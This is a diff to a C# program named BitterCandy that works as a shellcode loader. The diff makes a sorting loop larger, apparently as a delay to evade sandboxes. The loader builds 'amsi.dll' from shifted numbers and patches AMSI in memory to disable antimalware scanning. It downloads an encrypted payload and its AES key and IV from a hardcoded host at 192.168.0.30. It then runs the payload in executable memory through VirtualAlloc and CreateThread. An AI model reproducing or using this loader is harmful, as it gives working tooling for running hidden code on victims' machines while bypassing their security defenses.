@@ -82,7 +82,7 @@ namespace BitterCandy
             }
 
             Random rand = new Random();
-            int[] array = new int[20000];
+            int[] array = new int[110000];
             for (int i = 0; i < array.Length; i++)
             {
                 array[i] = rand.Next(1, 1000000); // or choose another range for the random numbers
@@ -97,15 +97,16 @@ namespace BitterCandy
 
             if (IsSorted(array))
             {
-                Console.WriteLine("The array is sorted.");
+                Console.WriteLine("The array is sorted and time was spent ");
             }
             else
             {
                 Console.WriteLine("The array is NOT sorted.");
-                Environment.Exit(1);
+                Environment.FailFast("Crash!");
             }
 
-
+            //patching AMSI using obfuscation
+            Console.WriteLine("patching AMSI using obfuscation");
             var randomNumbers = new int[] { 97, 109, 115, 105, 46, 100, 108, 108 };
             var shiftedNumbers = randomNumbers.Select(x => x + 1).ToArray();
             var charArray = shiftedNumbers.Select(x => (char)x).ToArray();
@@ -144,23 +145,20 @@ namespace BitterCandy
             }
 
             copy(Patch, Address);
-            Console.WriteLine("I did it !");
+            Console.WriteLine("AMSI patched!");
 
 
 
-            byte[] Nokkelen = new byte[] {
-            0x78,0x0c,0x99,0xd6,0xea,0xf5,0x16,0x59,0x5b,0xc8,0xd1,0x72,0x20,0x76,0x75,0x8b,0x0e,0x51,0x1f,0xb6,0x90,0x4e,0x3d,0x06,0x5e,0x08,0xcb,0x3b,0xc6,0x47,0xa1,0xaa
-            };
-
-            byte[] Ivektor = new byte[16] {
-                0xb6,0x85,0x54,0xd4,0x07,0xa7,0x1b,0x9a,0x31,0xa5,0xa7,0x50,0xeb,0x9a,0x35,0x71
- };
-
+            byte[] Nokkelen = new byte[32];
+            byte[] Ivektor = new byte[16];
             byte[] kodesnutt = null;
+            byte[] keyAndIv = null;
             try
             {
                 kodesnutt = RetrieveBinaryFile("http://192.168.0.30/end.bin");
-                //Console.WriteLine("Size of the array: " + kodesnutt.Length);
+                keyAndIv = RetrieveBinaryFile("http://192.168.0.30/key_iv.bin");
+                Array.Copy(keyAndIv, 0, Nokkelen, 0, 32);
+                Array.Copy(keyAndIv, 32, Ivektor, 0, 16);
 
             }
             catch (HttpRequestException e)
@@ -176,13 +174,9 @@ namespace BitterCandy
             int size = biler.Length;
 
             IntPtr va = VirtualAlloc(IntPtr.Zero, (uint)biler.Length, 0x3000, 0x40);
-
             Marshal.Copy(biler, 0, va, size);
-
             IntPtr thread = CreateThread(IntPtr.Zero, 0, va, IntPtr.Zero, 0, IntPtr.Zero);
-
             WaitForSingleObject(thread, 0xFFFFFFFF);
-
 
 
         }
